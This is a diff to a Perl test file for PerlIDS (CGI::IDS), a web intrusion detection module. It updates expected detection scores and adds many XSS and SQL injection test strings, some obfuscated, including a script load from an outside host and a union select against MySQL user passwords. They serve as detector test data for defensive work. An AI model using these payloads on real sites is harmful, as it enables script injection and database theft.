@@ -3,13 +3,13 @@
 #   01_ids.t
 # DESCRIPTION
 #   Tests for PerlIDS (CGI::IDS)
-#   based on PHPIDS http://php-ids.org tests/IDS/MonitorTest.php rev. 1277
+#   based on PHPIDS http://php-ids.org tests/IDS/MonitorTest.php rev. 1371
 # AUTHOR
 #   Hinnerk Altenburg <hinnerk@cpan.org>
 # CREATION DATE
 #   2008-07-01
 # COPYRIGHT
-#   Copyright (C) 2008, 2009 Hinnerk Altenburg
+#   Copyright (C) 2008-2010 Hinnerk Altenburg
 #
 #   This file is part of PerlIDS.
 #
@@ -34,7 +34,17 @@ use warnings;
 #------------------------- Libs ------------------------------------------------
 use Test::More tests => 59;
 
-use CGI::IDS;
+# test module loading
+BEGIN { use_ok('CGI::IDS') } # diag( "Testing CGI::IDS $CGI::IDS::VERSION, Perl $], $^X" );
+BEGIN { use_ok('XML::Simple', qw(:strict)) }
+BEGIN { use_ok('HTML::Entities') }
+BEGIN { use_ok('MIME::Base64') }
+BEGIN { use_ok('Encode', qw(decode)) }
+BEGIN { use_ok('Carp') }
+BEGIN { use_ok('JSON::XS') }
+BEGIN { use_ok('Time::HiRes') }
+BEGIN { use_ok('utf8') }
+BEGIN { use_ok('FindBin', qw($Bin)) }
 
 #------------------------- Test Data -------------------------------------------
 my %testSimpleScan = (
@@ -290,7 +300,6 @@ my %testConcatenatedXSSList2 = (
         21 => "ale&#8206;rt(1)",
         22 => 'al&#56325ert(1)',
         23 => 'al&#xdfff;ert(1)',
-        24 => 'al�ert(1)', #'alÔøΩert(1)',
         25 => '1[<t>__par{new Array}ent__</t>][<t>al{new Array}ert</t>](1) ',
         26 => '(new Option).style.setExpression(1,1&&name)',
         27 => 'default xml namespace=toolbar,b=1&&this.atob
@@ -406,9 +415,26 @@ my %testXSSList = (
 	33  => '<video/title=.10000/aler&#x74;(1) onload=.1/setTimeout(title)>',
 	34  => "const urchinTracker = open",
 	35  => "-setTimeout(
-							1E1+
-							',aler\
-							t ( /Mario dont go, its fun phpids rocks/ ) + 1E100000 ' )",
+						1E1+
+						',aler\
+						t ( /Mario dont go, its fun phpids rocks/ ) + 1E100000 ' )",
+	36 => '<b/alt="1"onmouseover=InputBox+1 language=vbs>test</b>',
+	37 => '$$=\'e\'
+						_=$$+\'val\'
+						$=_
+						x=this[$]
+						y=x(\'nam\' + $$)
+						x(y)
+						\'foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar.foo@bar\'',
+	38 => '‹img/src=x""onerror=alert(1)///›',
+	39 => 'Image() .
+						ownerDocument .x=1',
+	40 => CGI::IDS::urldecode('%FF%F0%80%BCimg%20src=x%20onerror=alert(1)//'),
+	41 => "',jQuery(\"body\").html(//);\'a'",
+	42 => '\',$(fred).set(\'html\',\'magically changes\')
+						\'s',
+	43 => "',YAHOO.util.Get.script(\"http://ha.ckers.org/xss.js\")
+						's",
 );
 
 my %testSelfContainedXSSList = (
@@ -438,6 +464,9 @@ my %testSelfContainedXSSList = (
 	                        Cen:tri:fug:eBy:pas:sTe:xt:do location=(xxx)
 	                        while(0)
 	                        ",
+	15 => '-parent(1)',
+	16 => "//asdf\@asdf.asdf//asdf\@asdf.asdf//asdf\@asdf.asdf//asdf\@asdf.asdf//asdf\@asdf.asdf//asdf\@asdf.asdf//asdf\@asdf.asdf//asdf\@asdf.asdf//asdf\@asdf.asdf//asdf\@asdf.asdf
+						(new Option)['innerHTML']=opener.name",
 );
 
 my %testSQLIList = (
@@ -669,7 +698,6 @@ my %testSQLIList5 = (
 	56  => "aa' / current_date != '1",
 	57  => "1' or current_date*-0 rlike'1",
 	58  => "0' / current_date XOR '1",
-	59  => "'or not'",
 	60  => "'or not false #aa",
 	61  => "1' * id - '0",
 	62  => "1' *id-'0",
@@ -704,6 +732,15 @@ my %testSQLIList6 = (
 	18 => "-1' union ((select (select user),(select password),1/1 from mysql.user)) order by '1 ",
 	19 => "-1' or substring(null/null,1/null,1) or '1",
 	20 => "1' and 1 = hex(null-1 or 1) or 1 /'null ",
+	21 => "AND CONNECTION_ID()=CONNECTION_ID()",
+	22 => "AND ISNULL(1/0)",
+	23 => "MID(\@\@hostname, 1, 1)",
+	24 => "CHARSET(CURRENT_USER())",
+	25 => "DATABASE() LIKE SCHEMA()",
+	26 => "COERCIBILITY(USER())",
+	27 => "1' and 0x1abc like 0x88 or '0",
+	28 => "'-1-0 union select (select `table_name` from `information_schema`.tables limit 1) and '1",
+	29 => "null''null' find_in_set(uname, 'lightos' ) and '1",
 );
 
 my %testDTList = (
@@ -797,7 +834,7 @@ my %testBase64CCConverter = (
 
 my %testDecimalCCConverter = (
 	0   => '&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#32;&#108;&#97;&#110;&#103;&#117;&#97;&#103;&#101;&#61;&#34;&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#62;&#32;&#10;&#47;&#47;&#32;&#67;&#114;&#101;&#97;&#109;&#111;&#115;&#32;&#108;&#97;&#32;&#99;&#108;&#97;&#115;&#101;&#32;&#10;&#102;&#117;&#110;&#99;&#116;&#105;&#111;&#110;&#32;&#112;&#111;&#112;&#117;&#112;&#32;&#40;&#32;&#41;&#32;&#123;&#32;&#10;&#32;&#47;&#47;&#32;&#65;&#116;&#114;&#105;&#98;&#117;&#116;&#111;&#32;&#112;&#250;&#98;&#108;&#105;&#99;&#111;&#32;&#105;&#110;&#105;&#99;&#105;&#97;&#108;&#105;&#122;&#97;&#100;&#111;&#32;&#97;&#32;&#97;&#98;&#111;&#117;&#116;&#58;&#98;&#108;&#97;&#110;&#107;&#32;&#10;&#32;&#116;&#104;&#105;&#115;&#46;&#117;&#114;&#108;&#32;&#61;&#32;&#39;&#97;&#98;&#111;&#117;&#116;&#58;&#98;&#108;&#97;&#110;&#107;&#39;&#59;&#32;&#10;&#32;&#47;&#47;&#32;&#65;&#116;&#114;&#105;&#98;&#117;&#116;&#111;&#32;&#112;&#114;&#105;&#118;&#97;&#100;&#111;&#32;&#112;&#97;&#114;&#97;&#32;&#101;&#108;&#32;&#111;&#98;&#106;&#101;&#116;&#111;&#32;&#119;&#105;&#110;&#100;&#111;&#119;&#32;&#10;&#32;&#118;&#97;&#114;&#32;&#118;&#101;&#110;&#116;&#97;&#110;&#97;&#32;&#61;&#32;&#110;&#117;&#108;&#108;&#59;&#32;&#10;&#32;&#47;&#47;&#32;&#46;&#46;&#46;&#32;&#10;&#125;&#32;&#10;&#118;&#101;&#110;&#116;&#97;&#110;&#97;&#32;&#61;&#32;&#110;&#101;&#119;&#32;&#112;&#111;&#112;&#117;&#112;&#32;&#40;&#41;&#59;&#32;&#10;&#118;&#101;&#110;&#116;&#97;&#110;&#97;&#46;&#117;&#114;&#108;&#32;&#61;&#32;&#39;&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#119;&#119;&#119;&#46;&#112;&#114;&#111;&#103;&#114;&#97;&#109;&#97;&#99;&#105;&#111;&#110;&#119;&#101;&#98;&#46;&#110;&#101;&#116;&#47;&#39;&#59;&#32;&#10;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#32;&#10;&#32;',
-	1   => '60,115,99,114,105,112,116,62,97,108,100+1,114,116,40,49,41,60,47,115,99,114,105,112,116,62',
+	1   => MIME::Base64::decode_base64('NjAsMTE1LDk5LDExNCwxMDUsMTEyLDExNiw2Miw5NywxMDgsMTAwKzEsMTE0LDExNiw0MCw0OSw0MSw2MCw0NywxMTUsOTksMTE0LDEwNSwxMTIsMTE2LDYy'),
 );
 
 my %testOctalCCConverter = (
@@ -883,18 +920,6 @@ my %testForFalseAlerts = (
 );
 
 #------------------------- Tests -----------------------------------------------
-
-# test module loading
-BEGIN { use_ok('CGI::IDS') } # diag( "Testing CGI::IDS $CGI::IDS::VERSION, Perl $], $^X" );
-BEGIN { use_ok('XML::Simple', qw(:strict)) }
-BEGIN { use_ok('HTML::Entities') }
-BEGIN { use_ok('MIME::Base64') }
-BEGIN { use_ok('Encode', qw(decode)) }
-BEGIN { use_ok('Carp') }
-BEGIN { use_ok('JSON::XS') }
-BEGIN { use_ok('Time::HiRes') }
-BEGIN { use_ok('utf8') }
-BEGIN { use_ok('FindBin', qw($Bin)) }
 
 # croak tests
 print testmessage("croak tests");
@@ -993,26 +1018,26 @@ is ($ids->detect_attacks(request => \%testWhitelistSkip3),					8,			"testWhiteli
 print testmessage("test converters and filters");
 is ($ids->detect_attacks(request => \%testAttributeBreakerList),			29,			"testAttributeBreakerList");
 is ($ids->detect_attacks(request => \%testCommentList),						9,			"testCommentList");
-is ($ids->detect_attacks(request => \%testConcatenatedXSSList),				1092,		"testConcatenatedXSSList");
-is ($ids->detect_attacks(request => \%testConcatenatedXSSList2),			880,		"testConcatenatedXSSList2");
-is ($ids->detect_attacks(request => \%testXMLPredicateXSSList),				154,		"testXMLPredicateXSSList");
+is ($ids->detect_attacks(request => \%testConcatenatedXSSList),				1120,		"testConcatenatedXSSList");
+is ($ids->detect_attacks(request => \%testConcatenatedXSSList2),			935,		"testConcatenatedXSSList2");
+is ($ids->detect_attacks(request => \%testXMLPredicateXSSList),				147,		"testXMLPredicateXSSList");
 is ($ids->detect_attacks(request => \%testConditionalCompilationXSSList),	87,			"testXMLPredicateXSSList");
-is ($ids->detect_attacks(request => \%testXSSList),							577,		"testXSSList");
-is ($ids->detect_attacks(request => \%testSelfContainedXSSList),			479,		"testSelfContainedXSSList");
-is ($ids->detect_attacks(request => \%testSQLIList),						450,		"testSQLIList");
-is ($ids->detect_attacks(request => \%testSQLIList2),						604,		"testSQLIList2");
-is ($ids->detect_attacks(request => \%testSQLIList3),						600,		"testSQLIList3");
-is ($ids->detect_attacks(request => \%testSQLIList4),						747,		"testSQLIList4");
-is ($ids->detect_attacks(request => \%testSQLIList5),						927,		"testSQLIList5");
-is ($ids->detect_attacks(request => \%testSQLIList6),						335,		"testSQLIList6");
+is ($ids->detect_attacks(request => \%testXSSList),							788,		"testXSSList");
+is ($ids->detect_attacks(request => \%testSelfContainedXSSList),			526,		"testSelfContainedXSSList");
+is ($ids->detect_attacks(request => \%testSQLIList),						457,		"testSQLIList");
+is ($ids->detect_attacks(request => \%testSQLIList2),						643,		"testSQLIList2");
+is ($ids->detect_attacks(request => \%testSQLIList3),						585,		"testSQLIList3");
+is ($ids->detect_attacks(request => \%testSQLIList4),						834,		"testSQLIList4");
+is ($ids->detect_attacks(request => \%testSQLIList5),						935,		"testSQLIList5");
+is ($ids->detect_attacks(request => \%testSQLIList6),						466,		"testSQLIList6");
 is ($ids->detect_attacks(request => \%testDTList),							121,		"testDTList");
-is ($ids->detect_attacks(request => \%testURIList),							131,		"testURIList");
-is ($ids->detect_attacks(request => \%testRFEList),							512,		"testRFEList");
+is ($ids->detect_attacks(request => \%testURIList),							143,		"testURIList");
+is ($ids->detect_attacks(request => \%testRFEList),							524,		"testRFEList");
 is ($ids->detect_attacks(request => \%testUTF7List),						71,			"testUTF7List");
 is ($ids->detect_attacks(request => \%testBase64CCConverter),				95,			"testBase64CCConverter");
-is ($ids->detect_attacks(request => \%testDecimalCCConverter),				67,			"testDecimalCCConverter");
+is ($ids->detect_attacks(request => \%testDecimalCCConverter),				72,			"testDecimalCCConverter");
 is ($ids->detect_attacks(request => \%testOctalCCConverter),				48,			"testOctalCCConverter");
-is ($ids->detect_attacks(request => \%testHexCCConverter),					106,		"testHexCCConverter");
+is ($ids->detect_attacks(request => \%testHexCCConverter),					99,		"testHexCCConverter");
 is ($ids->detect_attacks(request => \%testLDAPInjectionList),				20,			"testLDAPInjectionList");
 is ($ids->detect_attacks(request => \%testJSONScanning),					32,			"testJSONScanning");
 is ($ids->detect_attacks(request => \%testForFalseAlerts),					0,			"testForFalseAlerts");
